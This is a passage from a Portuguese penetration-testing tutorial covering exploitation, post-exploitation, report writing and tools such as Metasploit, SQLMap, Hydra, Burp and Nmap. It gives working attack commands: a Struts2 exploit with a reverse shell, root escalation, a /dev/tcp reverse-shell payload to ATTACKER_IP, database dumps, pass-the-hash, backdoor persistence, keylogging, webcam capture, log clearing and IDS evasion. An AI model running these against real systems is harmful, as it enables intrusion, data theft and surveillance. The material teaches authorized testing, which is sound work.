   - Documentar cada passo com screenshots/logs
   - Ter backup do sistema antes de exploitar
   - Notificar cliente imediatamente se encontrar algo crítico
   - Parar se detectar impacto em produção
```

**Tipos de exploração:**

```bash
# ============================================================================
# 1. EXPLORAÇÃO DE CVE CONHECIDOS (Metasploit)
# ============================================================================

# Exemplo: Explorar Apache Struts (Equifax breach 2017)
msfconsole
use exploit/multi/http/struts2_content_type_ognl
set RHOST exemplo.com
set RPORT 8080
set TARGETURI /struts2-showcase
exploit

# Se bem-sucedido:
# [*] Meterpreter session 1 opened
# meterpreter > sysinfo
# meterpreter > getuid  # Ver que usuário você é

# ============================================================================
# 2. SQL INJECTION (SQLMap)
# ============================================================================

# Testar se parâmetro é vulnerável
sqlmap -u "https://exemplo.com/product?id=1" --batch --dbs

# Dumpar banco de dados
sqlmap -u "https://exemplo.com/product?id=1" -D users -T accounts --dump

# Output:
# [INFO] fetching entries for table 'accounts'
# +----+----------+----------------------------------+
# | id | username | password (hash MD5)             |
# +----+----------+----------------------------------+
# | 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
# | 2  | user1    | e99a18c428cb38d5f260853678922e03 |

# ============================================================================
# 3. BRUTE FORCE DE AUTENTICAÇÃO (Hydra)
# ============================================================================

# Brute force SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://exemplo.com

# Brute force HTTP form login
hydra -l admin -P passwords.txt exemplo.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# ============================================================================
# 4. EXPLORAÇÃO DE REPOSITÓRIO .GIT EXPOSTO
# ============================================================================

# Clonar repositório .git exposto
git-dumper https://exemplo.com/.git/ ./repo-dumped

# Buscar secrets no código
cd repo-dumped
truffleHog . --regex --entropy=False
grep -r "password" .
grep -r "API_KEY" .
grep -r "SECRET" .

# Output comum:
# .env:DB_PASSWORD=Sup3rS3cr3t!
# config.js:API_KEY=sk-1234567890abcdef
# deploy.sh:AWS_SECRET_ACCESS_KEY=abc123...

# ============================================================================
# 5. COMMAND INJECTION
# ============================================================================

# Testar command injection em parâmetro 'host' (ping functionality)
curl "https://exemplo.com/ping?host=8.8.8.8;whoami"
curl "https://exemplo.com/ping?host=8.8.8.8%26%26whoami"
curl "https://exemplo.com/ping?host=8.8.8.8|id"

# Se vulnerável, response contém:
# PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
# www-data
# ^^ Nome do usuário do servidor!

# Exploração avançada: Reverse shell
# Payload: ;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Exemplo de Proof of Concept (PoC):**

```markdown
## 🔓 PoC: SQL Injection em /product

### Vulnerabilidade
SQL Injection no parâmetro `id` da URL `/product`.

### Impacto
- Acesso completo ao banco de dados
- Exfiltração de credenciais de 1.253 usuários
- Possível RCE via `xp_cmdshell` (SQL Server)

### Steps to Reproduce

1. Acessar URL vulnerável:
   ```
   https://exemplo.com/product?id=1
   ```

2. Injetar payload de teste (detectar vulnerabilidade):
   ```
   https://exemplo.com/product?id=1' OR '1'='1
   ```
   **Resultado**: Página lista TODOS os produtos (bypass de filtro)

3. Enumerar bancos de dados:
   ```bash
   sqlmap -u "https://exemplo.com/product?id=1" --dbs
   ```
   **Output**:
   ```
   [INFO] available databases [3]:
   [*] information_schema
   [*] mysql
   [*] production_db
   ```

4. Dumpar tabela de usuários:
   ```bash
   sqlmap -u "https://exemplo.com/product?id=1" \
          -D production_db -T users --dump --threads=5
   ```
   **Output**: 1.253 registros exportados para CSV

### Evidências

![Screenshot do SQLMap](./evidence/sqlmap-dump.png)
![Usuários dumpados](./evidence/users-table.png)

### Recomendação
1. Implementar prepared statements (queries parametrizadas)
2. Validar/sanitizar todos os inputs
3. Aplicar princípio do menor privilégio no banco
4. Implementar WAF com regras anti-SQLi
```

### 4. Pós-Exploração

**Definição**: Após ganhar acesso inicial, a fase de pós-exploração foca em **manter acesso, escalar privilégios, movimentar-se lateralmente e simular o que um atacante real faria** após comprometer um sistema.

**Objetivos da pós-exploração:**

```
┌─────────────────────────────────────────────────────────────┐
│              Objetivos de Pós-Exploração                    │
└─────────────────────────────────────────────────────────────┘

1️⃣ ESCALAÇÃO DE PRIVILÉGIOS
   └─ De usuário comum → root/SYSTEM/Administrator
   └─ Explorar misconfigurations, kernel exploits, sudo misuse

2️⃣ PERSISTÊNCIA
   └─ Garantir acesso futuro mesmo após reboot/patches
   └─ Backdoors, cron jobs, serviços maliciosos

3️⃣ MOVIMENTO LATERAL (Lateral Movement)
   └─ Usar sistema comprometido para atacar outros na rede
   └─ Pass-the-Hash, Kerberoasting, pivoting

4️⃣ EXFILTRAÇÃO DE DADOS
   └─ Simular roubo de dados sensíveis
   └─ Dump de databases, arquivos confidenciais

5️⃣ LIMPEZA DE RASTROS
   └─ Apagar logs de acesso
   └─ Remover backdoors instalados (cleanup)
```

**Técnicas de escalação de privilégios (Linux):**

```bash
# ============================================================================
# ENUMERAÇÃO PARA PRIVILEGE ESCALATION (Linux)
# ============================================================================

# 1. LinPEAS - Script automatizado de enum
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# 2. Verificar sudo mal configurado
sudo -l
# Output perigoso:
# (ALL) NOPASSWD: /usr/bin/find
# ^^ Podemos explorar com: sudo find . -exec /bin/bash \; -quit

# 3. Buscar binários com SUID bit (podem ser explorados)
find / -perm -4000 -type f 2>/dev/null
# Verificar em GTFOBins se algum pode ser explorado

# 4. Verificar kernel version (pode ter exploit)
uname -a
searchsploit "Linux Kernel 4.15.0"

# 5. Verificar cron jobs (pode ter script world-writable)
cat /etc/crontab
ls -la /etc/cron.*

# 6. Buscar arquivos com passwords
grep -r "password" /etc/ 2>/dev/null
cat /home/*/.bash_history | grep -i "pass"

# ============================================================================
# EXEMPLO: Exploração de sudo NOPASSWD
# ============================================================================

# Situação: user pode rodar 'find' com sudo sem senha
sudo -l
# (ALL) NOPASSWD: /usr/bin/find

# Exploit: find permite executar comandos
sudo find . -exec /bin/bash \; -quit
# Agora você é root!

whoami
# root
```

**Técnicas de movimento lateral:**

```bash
# ============================================================================
# LATERAL MOVEMENT - Pass-the-Hash (Windows)
# ============================================================================

# 1. Dumpar hashes NTLM da máquina comprometida
mimikatz
sekurlsa::logonpasswords
# Output: Hashes NTLM de usuários logados

# 2. Usar hash para autenticar em outra máquina (sem saber a senha)
pth-winexe -U DOMAIN/admin%aad3b435b51404eeaad3b435b51404ee:hash //192.168.1.20 cmd
# Agora temos shell na máquina 192.168.1.20 como admin!

# ============================================================================
# PIVOTING - Usar máquina comprometida como proxy
# ============================================================================

# Cenário: Comprometemos servidor web (DMZ), queremos acessar rede interna

# 1. Setup de port forwarding via SSH
ssh -L 8080:internal-server:80 user@compromised-web-server
# Agora localhost:8080 acessa internal-server:80

# 2. Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 user@compromised-web-server
# Configure proxychains para usar 127.0.0.1:9050
proxychains nmap -sT internal-network.local
```

### 5. Relatório e Documentação

**Definição**: Fase final onde **documentamos todos os achados** em relatórios técnicos e executivos, priorizamos vulnerabilidades por criticidade e fornecemos recomendações acionáveis de remediação.

**📋 Estrutura de um relatório de pentest:**

```markdown
┌─────────────────────────────────────────────────────────────┐
│             Estrutura de Relatório de Pentest               │
└─────────────────────────────────────────────────────────────┘

1. CAPA
   ├─ Nome do cliente
   ├─ Tipo de teste (External/Internal/Web App)
   ├─ Data de execução
   └─ Classificação (Confidencial)

2. SUMÁRIO EXECUTIVO (1-2 páginas)
   ├─ Objetivo do teste
   ├─ Escopo resumido
   ├─ Resumo de achados (Critical: 3, High: 7, Medium: 12...)
   ├─ Principais riscos (top 3)
   └─ Recomendações principais

3. METODOLOGIA
   ├─ Frameworks usados (OWASP, PTES)
   ├─ Ferramentas utilizadas
   ├─ Limitações e exclusões
   └─ Cronograma de testes

4. RESUMO DE VULNERABILIDADES
   ├─ Dashboard visual (gráficos de severidade)
   ├─ Tabela consolidada de findings
   └─ Comparison com teste anterior (se houver)

5. ACHADOS TÉCNICOS DETALHADOS
   Para cada vulnerabilidade:
   ├─ Título descritivo
   ├─ Severidade (CVSS score)
   ├─ Descrição técnica
   ├─ Impacto ao negócio
   ├─ Steps to Reproduce (passo a passo)
   ├─ Evidências (screenshots, logs, código)
   ├─ Recomendações de remediação
   └─ Referências (CVE, CWE, OWASP)

6. ANEXOS
   ├─ Outputs completos de ferramentas
   ├─ Scripts/exploits desenvolvidos
   ├─ Lista de hosts/serviços descobertos
   └─ Checklist de testes executados
```

**Exemplo de finding documentado:**

```markdown
## 🔴 [CRÍTICO] SQL Injection em /api/products

### Informações Gerais
| Campo | Valor |
|-------|-------|
| Severidade | 🔴 Crítica (CVSS 9.8) |
| Categoria | CWE-89: SQL Injection |
| Componente afetado | API REST - endpoint /api/products |
| URL vulnerável | https://exemplo.com/api/products?category=electronics |
| Método HTTP | GET |
| Parâmetro vulnerável | `category` |

### Descrição Técnica
O endpoint `/api/products` concatena diretamente input do usuário (parâmetro `category`) em query SQL sem sanitização ou prepared statements, permitindo **SQL Injection clássico**.

**Query vulnerável (inferida):**
```sql
SELECT * FROM products WHERE category = '" + userInput + "'"
```

### Impacto ao Negócio
| Impacto | Descrição |
|---------|-----------|
| **Confidencialidade** | 🔴 ALTA - Acesso a todo o banco de dados (1.2M registros de clientes, incluindo CPF, emails, endereços) |
| **Integridade** | 🟠 MÉDIA - Possível modificação/exclusão de dados via `UPDATE`/`DELETE` |
| **Disponibilidade** | 🟠 MÉDIA - Possível DoS via queries pesadas (`BENCHMARK()`) |
| **Conformidade** | 🔴 ALTA - Violação de LGPD (exposição de dados pessoais) |

**Estimativa de impacto financeiro:**
- Multa LGPD: até R$ 50 milhões (2% do faturamento)
- Processos judiciais de clientes
- Dano reputacional irreparável

### Steps to Reproduce

**Passo 1:** Testar se parâmetro é vulnerável
```bash
curl "https://exemplo.com/api/products?category=electronics'"
```
**Response:**
```json
{
  "error": "You have an error in your SQL syntax near ''' at line 1"
}
```
✅ Confirma SQL Injection (erro de sintaxe SQL vazado)

**Passo 2:** Confirmar com payload boolean-based
```bash
curl "https://exemplo.com/api/products?category=electronics' OR '1'='1"
```
**Response:** Retorna TODOS os produtos (bypass de filtro)

**Passo 3:** Enumerar bancos de dados
```bash
curl "https://exemplo.com/api/products?category=electronics' UNION SELECT schema_name,2,3 FROM information_schema.schemata--+"
```
**Response:**
```json
[
  {"id": "production_db", "name": 2, "price": 3},
  {"id": "analytics_db", "name": 2, "price": 3},
  ...
]
```

**Passo 4:** Exfiltrar dados de clientes
```bash
sqlmap -u "https://exemplo.com/api/products?category=electronics" \
       -D production_db -T customers --dump --batch
```
**Resultado:** 1.253.421 registros de clientes exportados

### Evidências

![SQL Error](./evidence/sql-error.png)
*Erro de sintaxe SQL confirmando vulnerabilidade*

![SQLMap Dump](./evidence/sqlmap-customers-dump.png)
*Exfiltração de dados de clientes via SQLMap*

![Sensitive Data](./evidence/customer-data-sample.png)
*Amostra de dados sensíveis acessados (CPF, endereço)*

### Recomendações de Remediação

#### Correção Imediata (0-7 dias) - URGENTE
1. **Desabilitar endpoint** `/api/products` temporariamente até correção
2. **Implementar WAF** (Web Application Firewall) com regras anti-SQLi
3. **Notificar ANPD** conforme LGPD (prazo: 72h após incidente)

#### Correção Permanente (7-30 dias)
1. **Refatorar código** para usar prepared statements:
   ```javascript
   // ❌ VULNERÁVEL
   const query = `SELECT * FROM products WHERE category = '${userInput}'`;
   
   // ✅ SEGURO
   const query = 'SELECT * FROM products WHERE category = ?';
   db.execute(query, [userInput]);
   ```

2. **Implementar validação de input**:
   ```javascript
   const validCategories = ['electronics', 'books', 'clothing'];
   if (!validCategories.includes(userInput)) {
     return res.status(400).json({ error: 'Invalid category' });
   }
   ```

3. **Aplicar princípio do menor privilégio** no banco:
   ```sql
   -- Usuário da aplicação NÃO deve ter permissão de DROP/ALTER
   REVOKE ALL ON *.* FROM 'app_user'@'localhost';
   GRANT SELECT, INSERT, UPDATE ON production_db.* TO 'app_user'@'localhost';
   ```

4. **Code review** de todos os endpoints que manipulam queries SQL

#### Melhorias de Longo Prazo (30-90 dias)
1. Implementar **SAST** (SonarQube, Semgrep) no CI/CD para detectar SQLi
2. Treinamento de segurança para desenvolvedores (OWASP Top 10)
3. Implementar **error handling** adequado (não vazar erros SQL)
4. **Monitoring e alertas** para tentativas de SQL Injection

### Referências
- CWE-89: SQL Injection - https://cwe.mitre.org/data/definitions/89.html
- OWASP SQL Injection - https://owasp.org/www-community/attacks/SQL_Injection
- OWASP Cheat Sheet: SQL Injection Prevention - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

### Timeline de Descoberta
- **2024-02-05 10:30**: Vulnerabilidade descoberta
- **2024-02-05 11:00**: PoC desenvolvido e validado
- **2024-02-05 11:15**: Cliente notificado via canal de emergência
- **2024-02-05 14:00**: Endpoint desabilitado pelo cliente
```

---

## 🔧 Ferramentas de Pentest

### 1. Nmap - Network Mapper

**Definição**: Ferramenta **#1 para descoberta de rede e auditoria de segurança**. Permite identificar hosts ativos, portas abertas, serviços em execução, sistemas operacionais e vulnerabilidades. É open-source, multiplataforma e possui centenas de scripts NSE (Nmap Scripting Engine) para testes avançados.

**Características principais**:
- **Port scanning**: Detecta portas abertas/fechadas/filtradas
- **OS detection**: Identifica sistema operacional via fingerprinting de TCP/IP
- **Service/version detection**: Determina aplicação e versão rodando em cada porta
- **NSE scripts**: 600+ scripts para testes de vulnerabilidades, brute force, discovery
- **Output flexível**: XML, normal, grepable - integra com outras ferramentas

**Quando usar**: 
- Início de qualquer pentest (reconhecimento ativo)
- Descobrir superfície de ataque (o que está exposto?)
- Validar se firewalls/IDS estão bloqueando corretamente
- Enumerar serviços antes de exploração

**Exemplo prático**:
```bash
# ============================================================================
# NMAP - Exemplos Práticos de Uso
# ============================================================================

# 1. Scan básico de portas mais comuns (top 1000)
nmap exemplo.com

# 2. Scan completo de todas as portas
nmap -p- exemplo.com
# -p- : Scan de portas 1-65535 (demora mais, mas encontra tudo)

# 3. Scan com detecção de SO e versões (requer root)
sudo nmap -sS -sV -O -A exemplo.com
# -sS : SYN scan (stealth, não completa handshake)
# -sV : Version detection (identifica aplicação e versão)
# -O  : OS detection
# -A  : Enable OS detection, version detection, script scanning, traceroute

# Output:
# PORT    STATE SERVICE  VERSION
# 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
# 80/tcp  open  http     Apache httpd 2.4.41
# 443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
# OS: Linux 5.4.0-135-generic (Ubuntu)

# 4. Scan de subnet inteira (descobrir hosts ativos)
nmap -sn 192.168.1.0/24
# -sn : Ping scan (descobre hosts ativos sem fazer port scan)

# 5. Scan de vulnerabilidades com scripts NSE
nmap --script vuln exemplo.com
# Executa TODOS os scripts de categoria 'vuln'
# Detecta: SQLi, XSS, SSL issues, etc

# 6. Scan específico para Web (http-*)
nmap -p80,443 --script http-enum,http-headers,http-methods exemplo.com
# http-enum: Enumera diretórios conhecidos
# http-headers: Analisa headers de segurança
# http-methods: Testa métodos HTTP perigosos (PUT, DELETE, TRACE)

# 7. Scan stealth evasivo (bypass IDS/IPS)
nmap -sS -T2 -f --data-length 20 --randomize-hosts exemplo.com
# -T2 : Timing polite (mais lento, menos detecção)
# -f  : Fragment packets (dificulta detecção)
# --data-length : Adiciona dados aleatórios (evita signatures)
# --randomize-hosts : Ordem aleatória de scan

# 8. Scan com output em múltiplos formatos
nmap -sV -oA scan_results exemplo.com
# -oA : Output em 3 formatos (normal, XML, grepable)
# Gera: scan_results.nmap, scan_results.xml, scan_results.gnmap

# 9. Detectar WAF/Firewall
nmap --script http-waf-detect,http-waf-fingerprint exemplo.com
# Identifica se há WAF (CloudFlare, AWS WAF, etc)

# 10. Brute force SSH (via NSE)
nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt exemplo.com
# ⚠️ Usar apenas em ambiente autorizado!
```

### 2. Metasploit Framework

**Definição**: **Framework de exploração e pentest mais popular do mundo**. Contém milhares de exploits, payloads, encoders e módulos auxiliares. Permite explorar vulnerabilidades conhecidas (CVEs) de forma automatizada, mas também desenvolver exploits customizados.

**Características principais**:
- **2.400+ exploits**: Para Windows, Linux, web apps, IoT, etc
- **Payloads modulares**: Meterpreter (shell avançado), reverse/bind shells
- **Post-exploitation**: Módulos para escalação de privilégios, pivoting, keystroke logging
- **Database backend**: Armazena resultados de scans e exploitation
- **Integration**: Integra com Nmap, Nessus, Burp Suite

**Quando usar**:
- Explorar CVE conhecido em versão desatualizada de software
- Validar se patch foi aplicado corretamente
- Simular ataque real com payloads avançados
- Post-exploitation (escalar privilégios, movimentar lateralmente)

**Exemplo prático**:
```bash
# ============================================================================
# METASPLOIT - Exploitação de Apache Struts2 (CVE-2017-5638)
# ============================================================================
# ⚠️ Esta é a vulnerabilidade explorada no breach da Equifax (2017)

# 1. Iniciar Metasploit
msfconsole

# 2. Buscar exploit para Struts2
msf6 > search struts2

# Output:
#    Name                                       Rank       Check  Description
#    ----                                       ----       -----  -----------
#    exploit/multi/http/struts2_content_type_ognl   excellent  Yes    Apache Struts 2 REST Plugin XStream RCE

# 3. Selecionar e configurar exploit
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(struts2_content_type_ognl) > show options

# 4. Configurar target
msf6 exploit(struts2_content_type_ognl) > set RHOST 192.168.1.100
msf6 exploit(struts2_content_type_ognl) > set RPORT 8080
msf6 exploit(struts2_content_type_ognl) > set TARGETURI /struts2-showcase

# 5. Configurar payload (Meterpreter reverse shell)
msf6 exploit(struts2_content_type_ognl) > set PAYLOAD linux/x64/meterpreter/reverse_tcp
msf6 exploit(struts2_content_type_ognl) > set LHOST 192.168.1.50  # Seu IP
msf6 exploit(struts2_content_type_ognl) > set LPORT 4444

# 6. Verificar se alvo é vulnerável
msf6 exploit(struts2_content_type_ognl) > check
# [+] The target is vulnerable.

# 7. Exploitar!
msf6 exploit(struts2_content_type_ognl) > exploit

# [*] Started reverse TCP handler on 192.168.1.50:4444
# [*] Sending stage (3045348 bytes) to 192.168.1.100
# [*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:45678)

# 8. Agora você tem shell interativo (Meterpreter)
meterpreter > sysinfo
# Computer        : web-server-01
# OS              : Ubuntu 16.04 (Linux 4.15.0-112-generic)
# Architecture    : x64
# Meterpreter     : x64/linux

meterpreter > getuid
# Server username: tomcat8 (uid=115, gid=125, euid=115, egid=125)

meterpreter > pwd
# /opt/tomcat/webapps/struts2-showcase

# 9. Escalar privilégios (explorar kernel vuln)
meterpreter > background  # Volta pra msfconsole sem fechar sessão
msf6 exploit(struts2_content_type_ognl) > use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
msf6 exploit(cve_2021_4034_pwnkit_lpe_pkexec) > set SESSION 1
msf6 exploit(cve_2021_4034_pwnkit_lpe_pkexec) > exploit

# [*] Meterpreter session 2 opened
meterpreter > getuid
# Server username: root (uid=0, gid=0, euid=0, egid=0)
# 🎉 Agora você é ROOT!

# 10. Post-exploitation - Dumpar hashes de senhas
meterpreter > cat /etc/shadow
meterpreter > download /etc/shadow /tmp/shadow.txt

# 11. Limpeza (remover evidências)
meterpreter > clearev  # Limpa event logs
meterpreter > exit
```

**Meterpreter - Comandos úteis:**

```bash
# ============================================================================
# METERPRETER - Comandos Essenciais
# ============================================================================

# --- Informações do Sistema ---
sysinfo                     # Info do OS, arquitetura, hostname
getuid                      # Usuário atual
ps                          # Processos rodando
netstat                     # Conexões de rede ativas
route                       # Tabela de roteamento
ifconfig                    # Interfaces de rede

# --- Navegação e Arquivos ---
pwd                         # Diretório atual
cd /etc                     # Mudar diretório
ls -la                      # Listar arquivos
cat /etc/passwd             # Ler arquivo
download /etc/passwd .      # Baixar arquivo do alvo
upload backdoor.sh /tmp/    # Enviar arquivo pro alvo
search -f *.conf            # Buscar arquivos

# --- Escalação de Privilégios ---
getsystem                   # Tenta elevar pra SYSTEM/root automaticamente
getprivs                    # Ver privilégios do usuário
use priv                    # Carregar módulo de privilégios

# --- Persistência ---
run persistence -X -i 60 -p 4444 -r 192.168.1.50
# Cria backdoor que reconecta a cada 60s

# --- Keylogging ---
keyscan_start               # Iniciar captura de teclas digitadas
keyscan_dump                # Ver teclas capturadas
keyscan_stop                # Parar captura

# --- Screenshot e Webcam ---
screenshot                  # Capturar screenshot da tela
webcam_snap                 # Tirar foto da webcam
webcam_stream               # Stream de vídeo da webcam

# --- Pivoting (usar máquina como proxy) ---
portfwd add -l 3389 -p 3389 -r 10.0.0.50
# Forward local 3389 -> 10.0.0.50:3389 (RDP de máquina interna)

# --- Limpeza ---
clearev                     # Limpar event logs (Windows)
rm /tmp/backdoor.sh         # Deletar arquivo
```

### 3. Burp Suite - Web Application Testing

**Definição**: **Proxy interceptador HTTP/HTTPS** e plataforma completa para pentest de aplicações web. Permite interceptar, analisar e modificar requests/responses, automatizar testes de vulnerabilidades e explorar manualmente falhas de lógica de negócio.

**Versões:**
- **Burp Suite Community (gratuito)**: Proxy, Repeater, Decoder - ferramentas manuais básicas
- **Burp Suite Professional**: + Scanner automatizado, Intruder (fuzzing), Collaborator (OOB), extensões

**Características principais**:
- **Proxy interceptador**: Captura e modifica HTTP/HTTPS traffic em tempo real
- **Repeater**: Repete e modifica requests manualmente
- **Intruder**: Fuzzing e brute force automatizado
- **Scanner**: Detecta vulnerabilidades (SQLi, XSS, XXE, etc) automaticamente
- **Decoder**: Encoders/decoders (Base64, URL, HTML, etc)
- **Comparer**: Compara responses para detectar diferenças sutis

**Quando usar**:
- Teste manual de aplicações web (explorar lógica de negócio)
- Interceptar e modificar requests (bypass de validações client-side)
- Fuzzing de parâmetros para encontrar vulnerabilidades
- Análise de APIs REST/GraphQL

**Exemplo prático**:
```bash
# ============================================================================
# BURP SUITE - Setup e Uso Básico
# ============================================================================

# 1. Configurar proxy no navegador
# Firefox: Preferences > Network > Settings
#   - Manual proxy: 127.0.0.1:8080
#   - ✅ Also use this proxy for HTTPS

# 2. Instalar certificado Burp (para interceptar HTTPS)
# - Acessar: http://burpsuite
# - Download "CA Certificate"
# - Firefox: Preferences > Privacy > Certificates > Import
# - ✅ Trust for identifying websites

# 3. Iniciar Burp Suite
burpsuite &
# Proxy > Intercept > ✅ Intercept is on

# ============================================================================
# EXEMPLO: Bypass de validação client-side
# ============================================================================

# Cenário: Formulário de cadastro valida email no front-end (JavaScript)
# mas não valida no back-end.

# 1. Preencher form com email inválido: "admin"
# 2. Submit é bloqueado por validação JS
# 3. No Burp, desabilitar JS: Proxy > Options > Match and Replace
#    - Add rule: Replace "<script" com "<disabled"
# 4. Recarregar página (agora sem JS)
# 5. Submit form - request é enviado ao servidor!
# 6. Servidor aceita "admin" como email (vulnerabilidade!)

# ============================================================================
# EXEMPLO: Fuzzing de parâmetros com Intruder
# ============================================================================

# 1. Capturar request:
POST /api/user/123 HTTP/1.1
Host: exemplo.com
Content-Type: application/json

{"userId": 123, "role": "user"}

# 2. Send to Intruder (Ctrl+I)
# 3. Marcar posição de injection:
{"userId": §123§, "role": "user"}

# 4. Payload type: Numbers (1-1000, step 1)
# 5. Start attack
# 6. Analisar responses:
#    - UserID 1-100: Status 200 (expõe dados de outros usuários!)
#    - UserID 456: Status 200, role: "admin" (conta privilegiada!)

# ============================================================================
# EXEMPLO: Detectar SQLi com Repeater
# ============================================================================

# 1. Capturar request GET /product?id=5
# 2. Send to Repeater (Ctrl+R)
# 3. Modificar manualmente:
GET /product?id=5' HTTP/1.1

# Response: SQL error (confirma SQLi!)

# 4. Testar payloads:
GET /product?id=5' OR '1'='1
# Response: Lista TODOS os produtos (bypass de filtro)

GET /product?id=5' UNION SELECT NULL,NULL,NULL--
# Response: 200 OK (3 colunas confirmadas)

GET /product?id=5' UNION SELECT username,password,NULL FROM users--
# Response: Exibe credenciais de usuários!
```

### 4. SQLMap - Automatic SQL Injection Tool

**Definição**: Ferramenta **automatizada de detecção e exploração de SQL Injection**. Suporta MySQL, PostgreSQL, Oracle, SQL Server, SQLite, MS Access e mais. Automatiza descoberta de vulnerabilidades, dumping de databases, shells interativos e até RCE (quando possível).

**Características principais**:
- **Detecção automática**: Testa 6 tipos de SQLi (boolean, error-based, time-based, UNION, stacked queries, OOB)
- **Database enumeration**: Lista databases, tables, columns, users
- **Data exfiltration**: Dumpa tabelas completas ou queries customizadas
- **OS exploitation**: Upload de shells, execução de comandos
- **WAF bypass**: Técnicas de evasão para bypassar WAFs (tamper scripts)

**Quando usar**:
- Confirmar se parâmetro é vulnerável a SQLi
- Automatizar exploração (enumerar DB, dumpar dados)
- Validar se WAF está bloqueando SQLi corretamente
- Pentests onde tempo é limitado (automatiza processo)

**Exemplo prático**:
```bash
# ============================================================================
# SQLMAP - Guia Completo
# ============================================================================

# 1. Teste básico de vulnerabilidade
sqlmap -u "https://exemplo.com/product?id=1"
# Output:
# [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
# [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND boolean-based blind' injectable
# [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 time-based blind' injectable

# 2. Listar databases
sqlmap -u "https://exemplo.com/product?id=1" --dbs
# Output:
# [INFO] available databases [3]:
# [*] information_schema
# [*] mysql
# [*] production_db

# 3. Listar tabelas de um database específico
sqlmap -u "https://exemplo.com/product?id=1" -D production_db --tables
# Output:
# [10 tables]
# +--------------+
# | customers    |
# | orders       |
# | products     |
# | users        |
# | credit_cards |  ⚠️ Sensível!
# ...

# 4. Listar colunas de uma tabela
sqlmap -u "https://exemplo.com/product?id=1" -D production_db -T users --columns
# Output:
# +------------+--------------+
# | Column     | Type         |
# +------------+--------------+
# | id         | int(11)      |
# | username   | varchar(50)  |
# | password   | varchar(255) |
# | email      | varchar(100) |
# | role       | enum         |

# 5. Dumpar dados de uma tabela
sqlmap -u "https://exemplo.com/product?id=1" \
       -D production_db -T users --dump
# Output: Exporta para CSV com todos os registros

# 6. Dumpar apenas usuários administradores
sqlmap -u "https://exemplo.com/product?id=1" \
       -D production_db -T users --dump \
       --where="role='admin'"

# 7. Testar com POST data
sqlmap -u "https://exemplo.com/login" \
       --data="username=admin&password=test" \
       -p username  # Testa apenas parâmetro 'username'

# 8. Bypass de WAF com tamper scripts
sqlmap -u "https://exemplo.com/product?id=1" \
       --tamper=space2comment,between,randomcase
# Aplica técnicas de evasão:
#   - space2comment: Substitui espaço por /**/
#   - between: AND -> AND ... BETWEEN ... AND
#   - randomcase: Alterna maiúsculas/minúsculas

# 9. Executar comando no servidor (se possível)
sqlmap -u "https://exemplo.com/product?id=1" --os-cmd="whoami"
# Tenta executar comando via xp_cmdshell (SQL Server) ou sys_exec (MySQL)

# 10. Upload de shell interativo
sqlmap -u "https://exemplo.com/product?id=1" --os-shell
# Output:
# os-shell> whoami
# www-data
# os-shell> cat /etc/passwd
# [conteúdo do arquivo]

# 11. Opções úteis para ambientes reais
sqlmap -u "URL" \
       --batch             # Não pedir confirmações interativas
       --threads=10        # Paralelizar (mais rápido)
       --level=5           # Nível de testes (1-5, default: 1)
       --risk=3            # Risco de queries (1-3, default: 1)
       --random-agent      # User-Agent aleatório (evasão)
       --timeout=10        # Timeout de requests
       --retries=3         # Tentativas em caso de erro
       --output-dir=/tmp/  # Diretório de output

# ============================================================================
# EXEMPLO REAL: Exploração Completa
# ============================================================================

# Passo 1: Detectar vulnerabilidade
sqlmap -u "https://exemplo.com/news.php?id=5" --batch

# Passo 2: Enumerar databases
sqlmap -u "https://exemplo.com/news.php?id=5" --dbs --batch

# Passo 3: Enumerar tabelas de 'production_db'
sqlmap -u "https://exemplo.com/news.php?id=5" -D production_db --tables --batch

# Passo 4: Dumpar tabela 'users' (só colunas importantes)
sqlmap -u "https://exemplo.com/news.php?id=5" \
       -D production_db -T users \
       -C username,password,email --dump --batch

# Passo 5: Crackar hashes MD5 encontrados
sqlmap -u "https://exemplo.com/news.php?id=5" \
       -D production_db -T users --dump --batch \
       --threads=10

# SQLMap automaticamente tenta crackar hashes comuns!
# Output:
# [INFO] cracked password '123456' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
# [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'
```

### 5. Nikto - Web Server Scanner

**Definição**: Scanner de vulnerabilidades **rápido e focado em servidores web**. Detecta misconfigurations, arquivos perigosos expostos, versões desatualizadas e milhares de vulnerabilidades conhecidas. É leve, rápido e ideal para reconhecimento inicial.

**Características principais**:
- **6.700+ testes** de vulnerabilidades e misconfigurations
- **Detecção de versões** desatualizadas de servidores (Apache, Nginx, IIS)
- **Arquivos sensíveis**: Detecta backups, logs, painéis admin expostos
- **Headers de segurança**: Analisa ausência de headers importantes
- **Anti-IDS evasion**: Técnicas para evitar detecção

**Quando usar**:
- Reconhecimento inicial de servidores web
- Auditorias rápidas de segurança
- Validar hardening de servidores web
- Descobrir arquivos esquecidos/expostos

**Exemplo prático**:
```bash
# ============================================================================
# NIKTO - Web Server Scanning
# ============================================================================

# 1. Scan básico
nikto -h https://exemplo.com

# Output:
# + Server: Apache/2.4.29 (Ubuntu)
# + The anti-clickjacking X-Frame-Options header is not present.
# + The X-Content-Type-Options header is not set.
# + /admin/: Admin login page/section found.
# + /backup/: Backup directory found.
# + /config.php: PHP Config file may contain database IDs and passwords.
# + /.git/config: Git configuration file found. May contain sensitive info.

# 2. Scan com output em HTML
nikto -h https://exemplo.com -o report.html -Format html

# 3. Scan de múltiplos hosts
nikto -h targets.txt
# targets.txt:
# https://exemplo1.com
# https://exemplo2.com
# https://exemplo3.com

# 4. Scan com evasão de IDS
